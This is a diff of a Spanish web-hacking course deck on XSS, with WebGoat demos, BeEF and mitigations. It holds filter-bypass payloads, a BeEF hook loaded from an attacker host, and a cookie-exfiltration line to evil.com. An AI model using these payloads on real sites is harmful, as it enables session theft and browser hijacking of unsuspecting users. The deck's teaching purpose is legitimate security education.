@@ -1,7 +1,7 @@
 # Deck — Clase 3 · Módulo 2
 
 > Curso de Web Hacking
-> Duración: 2 horas
+> Duración: ~1 hora (primera parte de Clase 4)
 > Formato: teoría + demos guiadas
 
 ---
@@ -27,13 +27,12 @@
 
 | Bloque | Contenido | Tiempo aprox. |
 |---|---|---|
-| **1** | XSS: contextos de ejecución y tipos | ~30 min |
-| 🧪 | Demo 1: Reflected XSS en WebGoat | ~20 min |
-| **2** | DOM XSS, bypass de filtros y payloads | ~30 min |
-| 🧪 | Demo 2: DOM XSS en WebGoat | ~20 min |
-| **3** | BeEF: control del navegador post-XSS | ~20 min |
-| 🧪 | Demo 3: BeEF hook en XSS | ~15 min |
-| 🏁 | Impacto real y mitigaciones | ~10 min |
+| **1** | XSS: contextos, tipos (Reflected/Stored/DOM) y comparativa | ~18 min |
+| **2** | Bypass de filtros y payloads | ~7 min |
+| 🧪 | Demo 1: DOM XSS en WebGoat | ~15 min |
+| **3** | BeEF: control del navegador post-XSS | ~5 min |
+| 🧪 | Demo 2: BeEF hook en XSS | ~10 min |
+| 🏁 | Impacto real y mitigaciones | ~5 min |
 
 ---
 
@@ -48,12 +47,8 @@ El navegador no distingue entre:
 
 Cuando esa distinción falla, el navegador ejecuta instrucciones que nunca debieron estar ahí.
 
----
-
-## ¿Por qué XSS sigue en el OWASP Top 10?
-
+**Por qué sigue en el OWASP Top 10:**
 - Afecta al **lado cliente** — muchos devs solo protegen el servidor
-- Los frameworks modernos mitigan *algunos* casos, pero no todos
 - DOM XSS no pasa por el backend → escapa a validaciones server-side
 - El impacto real va mucho más allá de un `alert()`
 
@@ -74,27 +69,6 @@ La regla: **identificar el contexto antes de armar el payload**.
 
 ---
 
-## Cómo detectar XSS: metodología
-
-1. Encontrar puntos de entrada (parámetros GET, POST, headers, fragmentos)
-2. Inyectar un string único de prueba (canary): `xss123test`
-3. Buscar dónde se refleja en la respuesta
-4. Determinar el contexto (HTML, atributo, JS, DOM)
-5. Armar el payload acorde al contexto
-6. Confirmar ejecución
-
-Con curl para detectar reflexión:
-
-```bash
-# Inyectar canary y buscar en la respuesta
-curl -s "http://target/search?q=xss123test" | grep "xss123test"
-
-# Ver en qué contexto cae
-curl -s "http://target/search?q=xss123test" | grep -B2 -A2 "xss123test"
-```
-
----
-
 ## XSS Reflejado (Reflected XSS)
 
 El payload:
@@ -102,16 +76,20 @@ El payload:
 2. Llega al servidor
 3. Vuelve inmediatamente en la respuesta sin sanitizar
 
-Típico en:
-- Buscadores internos
-- Mensajes de error
-- Parámetros GET/POST reflejados
-- Páginas de resultados
+**Cómo detectarlo:** inyectar un string único de prueba (canary, ej. `xss123test`), ver dónde se refleja en la respuesta y usar eso para determinar el contexto antes de armar el payload final.
 
-Ejemplo:
+Típico en: buscadores internos, mensajes de error, parámetros GET/POST reflejados.
+
+Ejemplo clásico:
 
 ```
 https://sitio.com/buscar?q=<script>alert('XSS')</script>
+```
+
+Si el input cae dentro de un atributo HTML hay que romper el atributo primero:
+
+```html
+"><script>alert('XSS')</script>
 ```
 
 ---
@@ -182,100 +160,35 @@ El servidor nunca ve el payload (está después del `#`). Solo el navegador lo p
 | ¿Pasa por servidor? | Sí | Sí (se guarda) | No necesariamente |
 | ¿Dónde está la falla? | Renderizado server-side | Almacenamiento + renderizado | JavaScript del cliente |
 | ¿Cómo lo investigás? | Request/response | Buscar dónde se almacena | DevTools + sources + DOM |
+| ¿Cómo se arregla? | Escape server-side | Escape server-side + sanitizar antes de guardar | Sanitizar en el JS del cliente |
 | ¿Persistente? | No | Sí | Depende del source |
 | ¿Víctimas? | 1 por click | Todas las que accedan | 1 por click (generalmente) |
 
 ---
 
-## 🧪 Demo guiada 1 — Reflected XSS en WebGoat
-
-**Target:** `Cross Site Scripting → Try It! Reflected XSS`
-
-Pasos:
-1. Abrir WebGoat → módulo Cross Site Scripting → pantalla 7
-2. Probar valores normales en los campos del formulario
-3. Inyectar el canary `test123` y ver dónde se refleja
-4. Probar payload según contexto:
-
-```html
-"><script>alert('XSS')</script>
-```
-
-5. Identificar el campo vulnerable
-6. Explicar por qué ese campo y no el otro
-
----
-
 ## Bypass de filtros
 
-Muchos filtros fallan porque hacen blacklist de patrones obvios:
-- Bloquean `<script>` → pero no `<img onerror=...>`
-- Bloquean `alert` → pero no `confirm`, `prompt`, `fetch`
-- Bloquean comillas → pero no backticks en template literals
-
-Payloads de bypass comunes:
+Muchos filtros fallan porque hacen blacklist de patrones obvios: bloquean `<script>` pero no otros vectores de ejecución.
 
 ```html
-<img src=x onerror=alert(1)>
-<svg onload=alert(1)>
-<body onload=alert(1)>
-<input onfocus=alert(1) autofocus>
-<details open ontoggle=alert(1)>
-<marquee onstart=alert(1)>
-```
-
----
-
-## Payloads alternativos
-
-Sin `<script>` hay muchas opciones:
-
-```html
-<!-- Evento con <img> -->
+<!-- Sin <script>: event handlers en HTML5 -->
 <img src=x onerror=alert(1)>
 
 <!-- SVG inline -->
 <svg onload=alert(1)>
 
-<!-- Event handlers en HTML5 -->
-<body onload=alert(1)>
-<input onfocus=alert(1) autofocus>
-<details open ontoggle=alert(1)>
-
-<!-- Sin paréntesis (bypass WAF) -->
-<img src=x onerror=alert`1`>
-
-<!-- Sin comillas ni espacios -->
-<svg/onload=alert(1)>
-```
-
-La seguridad por blacklist es frágil: el navegador tiene **muchas formas válidas** de ejecutar código.
-
----
-
-## Bypass: encoding y ofuscación
-
-```html
 <!-- Case variation -->
 <ScRiPt>alert(1)</sCrIpT>
 
-<!-- HTML entities -->
+<!-- Encoding: HTML entities -->
 <img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">
-
-<!-- Sin paréntesis (bypass WAF) -->
-<img src=x onerror=alert`1`>
-
-<!-- Sin comillas ni espacios -->
-<svg/onload=alert(1)>
-
-<!-- Evento con tab/newline -->
-<img src=x	onerror
-=alert(1)>
 ```
+
+La seguridad por blacklist es frágil: el navegador tiene **muchas formas válidas** de ejecutar código. Existen scanners automatizados (ej. `dalfox`) para encontrar XSS a mayor escala — se profundiza en Módulo 3.
 
 ---
 
-## 🧪 Demo guiada 2 — DOM XSS en WebGoat
+## 🧪 Demo guiada 1 — DOM XSS en WebGoat
 
 **Target:** `Cross Site Scripting → Identify potential for DOM-Based XSS` (pantalla 10-11)
 
@@ -293,72 +206,25 @@ http://target/WebGoat/start.mvc#test/<script>alert('DOM-XSS')</script>
 
 ---
 
-## Después de la demo: diferencias clave
-
-| Aspecto | Reflected XSS | DOM XSS |
-|---|---|---|
-| Herramienta principal | Burp / curl | DevTools |
-| Evidencia | Response del servidor contiene el payload | El DOM contiene el payload |
-| Detección automatizada | Fácil (scanners) | Difícil (requiere análisis de JS) |
-| Fix | Escape server-side | Sanitizar en el JS del cliente |
-
----
-
-## Herramientas para encontrar XSS
-
-| Herramienta | Uso |
-|---|---|
-| **Burp Suite Repeater** | Manipular parámetros y ver reflexión en respuesta |
-| **DevTools → Elements** | Ver dónde se inserta el input en el DOM |
-| **DevTools → Sources** | Leer el JavaScript que maneja el input |
-| **DevTools → Console** | Probar payloads directo |
-| `curl + grep` | Detectar reflexión automatizada |
-| **dalfox** | Scanner de XSS automatizado |
-
-```bash
-# dalfox básico
-dalfox url "http://target/search?q=test" --blind your.xss.ht
-
-# Con pipe desde parámetros descubiertos
-echo "http://target/page?name=test" | dalfox pipe
-```
-
----
-
 ## BeEF Framework: control del navegador
 
 Si logramos ejecutar JavaScript arbitrario, el navegador se convierte en una **plataforma de control remoto**.
 
-**BeEF (Browser Exploitation Framework)** demuestra post-explotación tras XSS exitoso:
-- Interacción con el DOM de la víctima
-- Captura de credenciales ingresadas
-- Reconocimiento de red interna (desde el navegador)
-- Ingeniería social (alertas falsas, pop-ups de phishing)
-- Detección de plugins y versión del navegador
-- Pivoteo hacia otras máquinas accesibles desde el navegador de la víctima
+**BeEF (Browser Exploitation Framework)** demuestra post-explotación tras XSS exitoso: captura de credenciales, keylogging, reconocimiento de red interna, pivoteo hacia otras máquinas e ingeniería social (fake login, fake update).
 
----
-
-## BeEF: cómo funciona
-
+**Cómo funciona:**
 1. El atacante inyecta un **hook** (script JS que conecta al panel BeEF):
 
 ```html
 <script src="http://attacker:3000/hook.js"></script>
 ```
 
-2. La víctima ejecuta el hook (via XSS)
-3. El navegador de la víctima se conecta al panel de BeEF
-4. El atacante ejecuta módulos desde el panel:
-   - Obtener cookies
-   - Detectar software instalado
-   - Capturar formularios
-   - Escanear red interna
-   - Social engineering (fake login, fake update)
+2. La víctima ejecuta el hook (vía XSS) y su navegador se conecta al panel de BeEF
+3. El atacante ejecuta módulos desde el panel: obtener cookies, capturar formularios, escanear red interna, social engineering
 
 ---
 
-## 🧪 Demo guiada 3 — BeEF hook en XSS
+## 🧪 Demo guiada 2 — BeEF hook en XSS
 
 **Setup:**
 1. Levantar BeEF en Kali/laboratorio
@@ -379,32 +245,17 @@ Si logramos ejecutar JavaScript arbitrario, el navegador se convierte en una **p
 
 ---
 
-## Qué demuestra BeEF en clase
-
-BeEF rompe dos ideas ingenuas sobre XSS:
-
-1. *"Fue solo un alert, no pasa nada"* → Se puede escalar a robo de sesión completo
-2. *"Si no toqué el servidor, el impacto es bajo"* → El navegador es un entorno de ejecución con capacidades poderosas
-
-Un XSS puede ser el punto de entrada para:
-- Secuestro de sesión activa
-- Pivoteo dentro de la red (el navegador de la víctima como proxy)
-- Abuso de confianza del usuario (acciones en su nombre)
-- Encadenamiento con CSRF u otras vulnerabilidades
-
----
-
 ## Impacto real de XSS
 
-Con XSS no solo mostrás un `alert(1)`. Es **prueba de ejecución**, no el objetivo final.
+BeEF rompe dos ideas ingenuas sobre XSS:
+1. *"Fue solo un alert, no pasa nada"* → se puede escalar a robo de sesión completo
+2. *"Si no toqué el servidor, el impacto es bajo"* → el navegador es un entorno de ejecución con capacidades poderosas
 
-Un atacante puede:
+Con XSS no solo mostrás un `alert(1)`. Es **prueba de ejecución**, no el objetivo final. Un atacante puede:
 - **Robar cookies/tokens:** `new Image().src='http://evil.com/?c='+document.cookie`
-- **Capturar credenciales:** Inyectar formulario falso de login
-- **Keylogger:** Registrar todo lo que escribe la víctima en tiempo real
-- **Redirigir:** `location='http://phishing.com'`
-- **Ejecutar acciones como la víctima:** Requests AJAX autenticados con su sesión
-- **Escalar mediante hooking:** Mantener control persistente del navegador
+- **Capturar credenciales:** inyectar formulario falso de login
+- **Keylogger, redirección y pivoteo** dentro de la red interna de la víctima
+- **Ejecutar acciones como la víctima:** requests AJAX autenticados con su sesión
 
 El verdadero impacto depende de la imaginación del atacante y los privilegios de la víctima.
 
@@ -427,24 +278,6 @@ Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self'
 
 ---
 
-## Entregables del lab
-
-Lo que deberían documentar:
-- Captura del `alert('XSS')` ejecutándose (Reflected y DOM)
-- Nombre del campo/parámetro vulnerable
-- Explicación del source y sink (en DOM XSS)
-- Payload usado y por qué funciona en ese contexto
-- Captura de navegador hooked en BeEF
-- Recomendación breve de mitigación
-
-Mitigaciones esperadas:
-- Escape/encoding según contexto
-- No insertar input crudo en HTML
-- CSP como defensa en profundidad
-- Frameworks con auto-escape por defecto
-
----
-
 ## Resumen de lo aprendido
 
 - XSS aparece cuando el navegador no puede distinguir datos de código
@@ -458,12 +291,13 @@ Mitigaciones esperadas:
 
 ## Próxima clase
 
-**Módulo 2 - Clase 4:**
-- **CSRF y SSRF:** Ataques que abusan de la confianza
-- **Deserialization attacks:** Cuando los objetos ejecutan código
-- **XXE:** Inyección en parsers XML
-- **File Upload vulnerabilities:** Cómo un avatar se convierte en shell
-- **Proyecto integrador del Módulo 2**
+**Misma Clase 4 — después de la pausa:**
+- **APIs modernas:** BOLA y Mass Assignment
+- **JWT:** ataques y debilidades comunes
+- **File Upload vulnerabilities**
+- **Metasploit:** explotación práctica
+
+Seguimos con `Modulo-4/deck_4_1.md`.
 
 ---
 
@@ -472,5 +306,11 @@ Mitigaciones esperadas:
 **Preguntas, consultas y dudas:**
 Durante la clase o por el canal del curso.
 
-**Para el próximo encuentro:**
-Practicar los labs de XSS en WebGoat y preparar dudas sobre CSRF/SSRF.
+**Antes de la pausa:**
+Repasá mentalmente contextos, tipos de XSS y bypass de filtros — volvemos en la misma clase con APIs modernas y Metasploit.
+
+---
+
+## Pausa — 20 minutos
+
+Volvemos en 20 minutos. Después: APIs modernas y Metasploit.
